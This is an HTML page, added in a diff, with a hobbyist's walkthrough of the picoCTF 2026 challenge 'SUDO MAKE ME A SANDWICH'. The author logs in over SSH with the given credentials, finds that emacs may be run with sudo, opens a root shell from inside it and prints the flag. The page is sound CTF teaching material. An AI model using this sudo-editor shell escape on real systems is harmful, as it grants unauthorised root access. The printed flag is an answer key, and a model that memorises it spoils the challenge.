@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF SUDO MAKE ME A SANDWICH @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve SUDO MAKE ME A SANDWICH</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>SUDO MAKE ME A SANDWICH</h2>
+            <pre>Name: SUDO MAKE ME A SANDWICH
+Description: Can you read the flag? I think you can! ssh -p 62884 ctf-player@green-hill.picoctf.net using password c136b219
+Author: Darkraicg492
+Tags: Easy, General Skills, picoCTF 2026
+Challenge from: picoCTF 2026
+Hints:
+1. What is sudo?
+2. How do you know what permission you have?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we don't get much information, we are just told that we need to read the fag in some way and we get an SSH command to do it. So I will take a quick glance at the hints to know a little more about the challenge. And it seems we have to check what permissions we have with sudo, that is simple, all we need to do is use sudo -l to list everything we can do with sudo, the command that gives administrator permissions to other commands.</p>
+            <h2>Solution</h2>
+            <p>So, if we enter into the SSH with the given command and check what we can do with sudo, we see something very interesting:</p>
+            <pre>shukularuni@SHUKULAP:~$ ssh -p 62884 ctf-player@green-hill.picoctf.net
+ctf-player@green-hill.picoctf.net's password: c136b219
+
+ctf-player@challenge:~$ ls
+flag.txt
+
+ctf-player@challenge:~$ cat flag.txt
+cat: flag.txt: Permission denied
+
+ctf-player@challenge:~$ sudo -l
+Matching Defaults entries for ctf-player on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/emacs</pre>
+            <p>It seems that we have a single command that we can run with sudo, which is emacs. We also can see that we have the flag file right there on the home folder, but can't open it without the administrator permission. So the solution is simple, run the emacs program with sudo, and do something from there to get the flag while in admin mode with sudo. And if I'm not wrong; I think there was a way to get a terminal from inside that emacs program, we can see on the <a href="https://gnu.org/software/emacs/manual/html_node/emacs/Man-Page.html" target="_blank">manual of this command</a> that it's possible to get into the shell using Alt+X then typing shell (M-x is codename for Alt+X and after pressing these keys you get an input where you can type the word 'shell'):</p>
+            <pre>pctf-player@challenge:~$ sudo /bin/emacs
+*GNU Emacs*
+---------------------
+M-x shell
+
+root@challenge:/home/ctf-player# ls
+flag.txt
+
+root@challenge:/home/ctf-player# cat flag.txt
+picoCTF{ju57_5ud0_17_f8185e1e}
+
+root@challenge:/home/ctf-player# exit
+exit
+
+Process shell finished</pre>
+            <p>There we go! That's the flag.</p>
+            <p>To exit this state of emacs, just type exit into the shell, then hit Ctrl+X and Ctrl+C, then type exit again to exit the SSH session.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/735">https://play.picoctf.org/practice/challenge/735</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
